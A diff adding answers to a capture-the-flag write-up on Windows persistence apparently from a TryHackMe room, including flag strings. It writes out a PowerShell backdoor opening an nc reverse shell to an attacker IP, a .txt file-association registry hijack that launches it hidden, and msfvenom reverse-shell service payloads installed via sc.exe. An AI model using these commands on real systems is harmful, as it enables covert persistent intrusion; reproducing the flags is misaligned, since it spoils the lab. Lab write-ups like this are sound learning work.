@@ -452,6 +452,39 @@ Finally, create a listener for your reverse shell and try to open any .txt file 
 
 * Insert flag6 here
 
+    `THM{TXT_FILES_WOULD_NEVER_HURT_YOU}`
+
+    * Create ps1 script save to `C:\Windows\backdoor2.ps1`
+
+        ```
+        Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.9.251.6 6666"
+        C:\Windows\system32\NOTEPAD.EXE $args[0]
+        ```
+
+    * Open `regedit` and .txt file ProgID
+
+        ![task3-registry](./images/task3-registry.png)
+
+    * Search for a subkey for the corresponding ProgID 
+
+        ![task3-registry-progid.png](./images/task3-registry-progid.png)
+
+    * Change the registry key to run our backdoor script
+
+        ```
+        powershell.exe -windowstyle hidden C:\Windows\backdoor2.ps1 %1
+        ```
+
+        ![task3-backdoor-progid](./images/task3-backdoor-progid.png)
+
+    * Set listener on out machine
+
+        ![task3-listener4](./images/task3-listener4.png)
+
+    * Open any .txt file on target machine and get the shell
+
+        ![task3-flag3-ans](./images/task3-flag3-ans.png)
+
 ## Task 4 - Abusing Services
 
 Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.
@@ -529,7 +562,69 @@ You can then query the service's configuration again to check if all went as exp
 
 * Insert flag7 here
 
+    `THM{SUSPICIOUS_SERVICES}`
+
+    * Create payload   
+
+        ```
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.251.6 LPORT=5555 -f exe-service -o rev-svc.exe
+        ```
+
+        ![task4-payload](./images/task4-payload.png)
+
+    * Download payload to target machine
+
+        ![task4-download](./images/task4-download.png)
+
+    * Setup listener on our machine
+
+        ![task3-listener2](./images/task3-listener2)
+
+    * Setup the service
+
+        ```
+        sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
+        sc.exe start THMservice2
+        ```
+
+        ![task4-thmservice2](./images/task4-thmservice2.png)
+
+    * Get the shell and flag
+
+        ![task4-flag7](./images/task4-flag7.png)
+
+
 * Insert flag8 here
+
+    `THM{IN_PLAIN_SIGHT}`
+
+    * Create payload
+
+        ```
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.251.6 LPORT=6666 -f exe-service -o rev-svc2.exe
+        ```
+
+        ![task4-payload2](./images/task4-payload2.png)
+
+    * Download payload to target machine
+
+        ![task4-download2](./images/task4-download2.png)
+
+    * Setup listener on our machine
+
+        ![task3-listener4](./images/task3-listener4)
+
+    * Reconfigure "THMservice3" parameters
+
+        ```
+        sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+        ```
+
+        ![task4-thmservice](./images/task4-thmservice.png)
+
+    * Restart the service and get the shell
+
+        ![task4-flag8](./images/task4-flag8.png)
 
 ## Task 5 - Abusing Scheduled Tasks
 
